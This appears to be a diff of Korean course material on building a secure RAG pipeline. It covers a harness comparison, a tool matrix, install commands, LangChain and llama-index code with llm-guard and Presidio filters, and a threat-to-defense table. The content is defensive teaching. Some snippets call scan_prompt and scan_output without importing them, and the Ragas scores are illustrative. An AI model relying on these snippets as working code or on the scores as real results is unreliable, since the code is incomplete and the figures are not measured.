+    HARNESS["에이전트 하네스"]
+    HARNESS --> SS["서버 사이드<br/>(Bastion)"]
+    HARNESS --> CS["클라이언트 사이드<br/>(Claude Code)"]
+    HARNESS --> EMB["Embedded<br/>(앱 내장)"]
+    SS -->|용도| OPS["24/7 운영"]
+    CS -->|용도| DEV["개발 보조"]
+    EMB -->|용도| FEAT["앱 기능"]
+
+    style HARNESS fill:#cce6ff
+```
+
+### Case 1: 서버 vs 클라이언트 하네스 비교
+
+| 항목 | 서버 사이드 | 클라이언트 사이드 |
+|---|---|---|
+| 운영 형태 | 24/7 daemon | 사용자 호출 시 |
+| 권한 범위 | 시스템 access | 사용자 권한 |
+| dataset 처리 | 13K 신호 자동 | 사용자 요청만 |
+| 예시 | Bastion | Claude Code |
+
+### Case 2: 하네스 선택 가이드라인
+
+| 시나리오 | 적합한 하네스 |
+|---|---|
+| 24/7 SOC 자동화 | 서버 (Bastion) |
+| 분석가 Q&A 보조 | 클라이언트 (Claude Code) |
+| 앱 기능 (RAG 검색) | Embedded |
+
+### 이 사례에서 학생이 배워야 할 3가지
+
+1. **3 하네스 = 3 운영 모델** — 24/7 / 사용자 호출 / 앱 기능.
+2. **서버 = 자동화, 클라이언트 = 보조** — 역할 명확.
+3. **dataset 13K 자동 처리는 서버 하네스만** — 클라이언트로는 불가능.
+
+**학생 액션**: 본인 시나리오에 적합한 하네스 1개 선택 + 이유 1문단.
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course10 — Week 04 RAG 보안)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | RAG framework | **llama-index** / langchain RAG |
+| s2 | Vector DB | **Chroma** / Weaviate / Qdrant / Milvus / pgvector |
+| s3 | Embedding 모델 | sentence-transformers / nomic-embed-text |
+| s4 | RAG 품질 평가 | **Ragas** / TruLens / DeepEval |
+| s5 | PII 마스킹 (인덱스) | Presidio (course7 재사용) |
+| s6 | 입출력 필터 | llm-guard PromptInjection / Sensitive |
+| s7 | Reranking | Cohere reranker (commercial) / **bge-reranker-base** |
+| s8 | 통합 secure RAG | 위 도구 통합 |
+
+### 학생 환경 준비
+
+```bash
+source ~/.venv-aagent/bin/activate
+
+# RAG framework
+pip install llama-index llama-index-llms-ollama llama-index-embeddings-huggingface
+pip install langchain langchain-community langchain-chroma
+
+# Vector DB
+pip install chromadb weaviate-client qdrant-client pymilvus pgvector
+
+# Embedding
+pip install sentence-transformers
+ollama pull nomic-embed-text                          # 768-dim, multilingual
+
+# Eval
+pip install ragas trulens-eval deepeval
+
+# Reranker
+pip install FlagEmbedding                             # bge-reranker
+
+# Security
+pip install llm-guard presidio-analyzer presidio-anonymizer
+```
+
+### 핵심 — Secure RAG (LangChain + Chroma + llm-guard + Presidio)
+
+```python
+from langchain_community.document_loaders import DirectoryLoader
+from langchain.text_splitter import RecursiveCharacterTextSplitter
+from langchain_community.vectorstores import Chroma
+from langchain_community.embeddings import HuggingFaceEmbeddings
+from langchain_ollama import OllamaLLM
+from langchain.chains import RetrievalQA
+from llm_guard.input_scanners import PromptInjection, Anonymize
+from llm_guard.output_scanners import Sensitive, Code
+from presidio_analyzer import AnalyzerEngine
+from presidio_anonymizer import AnonymizerEngine
+
+# === Phase 1: Secure indexing ===
+
+# 1) 문서 load
+loader = DirectoryLoader("/data/security_docs", glob="**/*.md")
+docs = loader.load()
+
+# 2) PII 자동 마스킹 (인덱스 시점에 — 가장 안전)
+analyzer = AnalyzerEngine()
+anonymizer = AnonymizerEngine()
+
+for doc in docs:
+    results = analyzer.analyze(text=doc.page_content, language='en')
+    if results:
+        anonymized = anonymizer.anonymize(text=doc.page_content, analyzer_results=results)
+        doc.page_content = anonymized.text
+    # 한국어 검증
+    results_ko = analyzer.analyze(text=doc.page_content, language='ko')
+    if results_ko:
+        doc.page_content = anonymizer.anonymize(text=doc.page_content, analyzer_results=results_ko).text
+
+# 3) Chunking
+splitter = RecursiveCharacterTextSplitter(chunk_size=1000, chunk_overlap=200)
+chunks = splitter.split_documents(docs)
+
+# 4) Embedding + Store
+embeddings = HuggingFaceEmbeddings(model_name="all-MiniLM-L6-v2")
+vectorstore = Chroma.from_documents(
+    chunks, embeddings, persist_directory="/var/lib/secure_rag"
+)
+
+# === Phase 2: Secure query ===
+
+llm = OllamaLLM(model="gemma3:4b")
+
+input_scanners = [PromptInjection(threshold=0.5), Anonymize()]
+output_scanners = [Sensitive(), Code(deny=["malicious"])]
+
+def secure_query(question: str) -> str:
+    # 1) 입력 검증
+    sanitized, valid, scores = scan_prompt(input_scanners, question)
+    if not all(valid.values()):
+        return f"Request denied (injection detected): {scores}"
+    
+    # 2) Retrieval (검색)
+    qa_chain = RetrievalQA.from_chain_type(
+        llm=llm,
+        chain_type="stuff",
+        retriever=vectorstore.as_retriever(search_kwargs={"k": 5}),
+        return_source_documents=True
+    )
+    response = qa_chain.invoke({"query": sanitized})
+    
+    # 3) 출력 검증 (민감 정보 누출 방지)
+    answer = response["result"]
+    sanitized_out, valid, _ = scan_output(output_scanners, sanitized, answer)
+    
+    # 4) 출처 표시 (검증된 문서)
+    sources = [d.metadata.get('source', 'unknown') for d in response["source_documents"]]
+    
+    return f"{sanitized_out}\n\n출처: {', '.join(sources)}"
+
+# Test
+result = secure_query("SQLi 어떻게 방어?")
+print(result)
+```
+
+### llama-index Secure RAG (대안)
+
+```python
+from llama_index.core import VectorStoreIndex, SimpleDirectoryReader, Settings
+from llama_index.llms.ollama import Ollama
+from llama_index.embeddings.huggingface import HuggingFaceEmbedding
+from llama_index.vector_stores.chroma import ChromaVectorStore
+from llama_index.core import StorageContext
+
+# Config
+Settings.llm = Ollama(model="gemma3:4b", base_url="http://localhost:11434")
+Settings.embed_model = HuggingFaceEmbedding(model_name="all-MiniLM-L6-v2")
+
+# Vector store
+import chromadb
+client = chromadb.PersistentClient(path="/var/lib/secure_rag")
+collection = client.get_or_create_collection("docs")
+vector_store = ChromaVectorStore(chroma_collection=collection)
+storage_context = StorageContext.from_defaults(vector_store=vector_store)
+
+# Index 생성
+docs = SimpleDirectoryReader("/data").load_data()
+index = VectorStoreIndex.from_documents(docs, storage_context=storage_context)
+
+# Query engine + 후처리
+query_engine = index.as_query_engine(
+    similarity_top_k=5,
+    response_mode="tree_summarize"
+)
+
+response = query_engine.query("질문")
+print(response.response)
+print("Sources:", [n.metadata for n in response.source_nodes])
+```
+
+### Reranking (정확도 향상)
+
+```python
+from FlagEmbedding import FlagReranker
+
+reranker = FlagReranker('BAAI/bge-reranker-base', use_fp16=True)
+
+def rerank_search(query: str, top_k: int = 10):
+    # 1) Vector search (top 50)
+    docs = vectorstore.similarity_search(query, k=50)
+    
+    # 2) Reranker (정확도 ↑)
+    pairs = [(query, doc.page_content) for doc in docs]
+    scores = reranker.compute_score(pairs)
+    
+    # 3) 상위 top_k 만
+    ranked = sorted(zip(docs, scores), key=lambda x: x[1], reverse=True)
+    return [doc for doc, score in ranked[:top_k]]
+```
+
+### Ragas (RAG 품질 평가)
+
+```python
+from ragas import evaluate
+from ragas.metrics import (
+    faithfulness,                    # 응답이 context 와 일치
+    answer_relevancy,                # 응답이 질문에 적절
+    context_precision,               # 검색된 context 가 정확
+    context_recall,                  # 모든 필요 context 검색됨
+    answer_correctness               # 정답과 일치
+)
+from datasets import Dataset
+
+# Test dataset
+test_data = Dataset.from_list([
+    {
+        "question": "SQLi 방어법?",
+        "answer": llm_response,
+        "contexts": retrieved_docs,
+        "ground_truth": "Prepared statement, 입력 검증, ..."
+    },
+    # ... 100+ test cases
+])
+
+result = evaluate(
+    test_data,
+    metrics=[faithfulness, answer_relevancy, context_precision, context_recall, answer_correctness]
+)
+print(result)
+# faithfulness: 0.92    (높을수록 hallucination 적음)
+# answer_relevancy: 0.89
+# context_precision: 0.85
+# context_recall: 0.78
+# answer_correctness: 0.88
+```
+
+### RAG 위협 매트릭스
+
+| 위협 | 방어 |
+|------|------|
+| Prompt injection (직접) | llm-guard input scanner |
+| Indirect injection (외부 doc) | 인덱스 시점 PII 마스킹 + scan |
+| 민감 정보 검색 → 누출 | 출력 scanner Sensitive |
+| Context dilution | reranker + relevance threshold |
+| Hallucination | Ragas faithfulness 측정 |
+| 출처 누락 | source 강제 표시 |
+| Embedding 추출 | rate limit + 사용자 quota |
+| Retrieval 변조 | 인덱스 무결성 (cosign 서명) |
+
+학생은 본 4주차에서 **llama-index + Chroma + sentence-transformers + Ragas + llm-guard + Presidio + bge-reranker** 7 도구로 secure RAG 의 4 layer (인덱스 마스킹 / 검색 격리 / 입력 필터 / 출력 필터) + 품질 평가 통합을 익힌다.
